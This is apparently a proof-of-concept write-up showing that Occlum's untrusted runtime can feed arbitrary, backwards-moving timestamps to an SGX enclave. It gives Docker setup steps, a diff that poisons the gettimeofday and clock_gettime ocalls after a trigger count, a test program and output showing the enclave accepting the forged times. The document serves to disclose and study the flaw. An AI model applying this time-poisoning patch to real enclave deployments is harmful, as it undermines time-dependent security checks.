# Occlum
There is a Docker container provided by Occlum:
```bash
docker run -it --device /dev/sgx/enclave --device /dev/sgx/provision occlum/occlum:0.29.4-ubuntu20.04
cd /root/demos/hello_c
make
mkdir occlum_workspace && cd occlum_workspace
occlum init && rm -rf image
copy_bom -f ../hello.yaml --root image --include-dir /opt/occlum/etc/template
occlum build
occlum run /bin/hello_world
```

## Proof-of-concept exploit

### Patch untrusted runtime

```
diff --git a/src/pal/src/ocalls/time.c b/src/pal/src/ocalls/time.c
index 7bfcf737..9b7b5507 100644
--- a/src/pal/src/ocalls/time.c
+++ b/src/pal/src/ocalls/time.c
@@ -3,13 +3,41 @@
 #include <sys/timerfd.h>
 #include <sys/prctl.h>
 #include "ocalls.h"
+#include <stdio.h>
+
+/* PoC to show we can make time go backwards arbitrarily */
+long attacker_poison[10] = {500, 200, 300, 100, 500, 400, 200, 100, 1000, 20};
+int attacker_idx = 0;
+
+int trigger = 17;
+int count = 0;
 
 void occlum_ocall_gettimeofday(struct timeval *tv) {
     gettimeofday(tv, NULL);
+    printf("[attacker] original gettimeofday sec/usec: %lu/%lu\n",tv->tv_sec, tv->tv_usec);
+
+    count++;
+    printf("[attacker] timeofday count is %d\n", count);
+    if (count > trigger)
+    {
+	    tv->tv_sec = attacker_poison[attacker_idx++ % 10];
+	    tv->tv_usec = attacker_poison[attacker_idx++ % 10];
+	    printf("[attacker] POISONED gettimeofday sec/usec: %lu/%lu\n",tv->tv_sec, tv->tv_usec);
+    }
 }
 
 void occlum_ocall_clock_gettime(int clockid, struct timespec *tp) {
     clock_gettime(clockid, tp);
+    printf("[attacker] original clock_getttime sec/nsec: %lu/%lu\n",tp->tv_sec, tp->tv_nsec);
+
+    count++;
+    printf("[attacker] clock_getttime count is %d\n", count);
+    if (count > trigger)
+    {
+    	tp->tv_sec = attacker_poison[attacker_idx++ % 10];
+    	tp->tv_nsec = attacker_poison[attacker_idx++ % 10];
+    	printf("[attacker] POISONED clock_getttime sec/nsec: %lu/%lu\n",tp->tv_sec, tp->tv_nsec);
+    }
 }
 
 void occlum_ocall_clock_getres(int clockid, struct timespec *res) {
@@ -55,4 +83,4 @@ int occlum_ocall_timerfd_settime(int fd, int flags, const struct itimerspec *new
 
 int occlum_ocall_timerfd_gettime(int fd, struct itimerspec *curr_value) {
     return timerfd_gettime(fd, curr_value);
-}
\ No newline at end of file
+}
```

### Example C enclave program

```c
root@cc27ffbcc449:~/demos/hello_c# cat hello_world.c 
#include <stdio.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <time.h>

int main() {
    struct timeval tv;
    printf("Hello World!\n");


    int	rc = syscall(SYS_gettimeofday, &tv, NULL);

        if (!rc)
        	printf("Microseconds: %lu/%lu\n",tv.tv_sec, tv.tv_usec);

    rc = syscall(SYS_gettimeofday, &tv, NULL);
        if (!rc)
        	printf("Microseconds: %lu/%lu\n",tv.tv_sec, tv.tv_usec);

    struct timespec ts;
    if (!clock_gettime(CLOCK_REALTIME, &ts))
        	printf("enclave clock_gettime is: %lu/%lu\n", ts.tv_sec, ts.tv_nsec);

    return 0;
}
```

### Reference output

```
Built the Occlum image and enclave successfully
[attacker] original clock_getttime sec/nsec: 1318772/694742430
[attacker] clock_getttime count is 1
[attacker] original clock_getttime sec/nsec: 1676574517/625730692
[attacker] clock_getttime count is 2
[attacker] original gettimeofday sec/usec: 1676574517/641097
[attacker] timeofday count is 3
[attacker] original gettimeofday sec/usec: 1676574517/644066
[attacker] timeofday count is 4
[attacker] original gettimeofday sec/usec: 1676574517/652674
[attacker] timeofday count is 5
[attacker] original gettimeofday sec/usec: 1676574517/653454
[attacker] timeofday count is 6
[attacker] original gettimeofday sec/usec: 1676574517/660370
[attacker] timeofday count is 7
[attacker] original gettimeofday sec/usec: 1676574517/663632
[attacker] timeofday count is 8
[attacker] original clock_getttime sec/nsec: 1318772/735519067
[attacker] clock_getttime count is 9
[attacker] original clock_getttime sec/nsec: 1318772/972821031
[attacker] clock_getttime count is 10
[attacker] original gettimeofday sec/usec: 1676574517/952910
[attacker] timeofday count is 11
[attacker] original gettimeofday sec/usec: 1676574517/954770
[attacker] timeofday count is 12
[attacker] original gettimeofday sec/usec: 1676574517/957286
[attacker] timeofday count is 13
[attacker] original gettimeofday sec/usec: 1676574517/957832
[attacker] timeofday count is 14
[attacker] original gettimeofday sec/usec: 1676574517/958775
[attacker] timeofday count is 15
[attacker] original gettimeofday sec/usec: 1676574517/959738
[attacker] timeofday count is 16
[attacker] original clock_getttime sec/nsec: 1318774/530677370
[attacker] clock_getttime count is 17
Hello World!
[attacker] original gettimeofday sec/usec: 1676574519/462602
[attacker] timeofday count is 18
[attacker] POISONED gettimeofday sec/usec: 500/200
Microseconds: 500/200
[attacker] original gettimeofday sec/usec: 1676574519/462692
[attacker] timeofday count is 19
[attacker] POISONED gettimeofday sec/usec: 300/100
Microseconds: 300/100
[attacker] original clock_getttime sec/nsec: 1676574519/462791758
[attacker] clock_getttime count is 20
[attacker] POISONED clock_getttime sec/nsec: 500/400
enclave clock_gettime is: 500/400
```
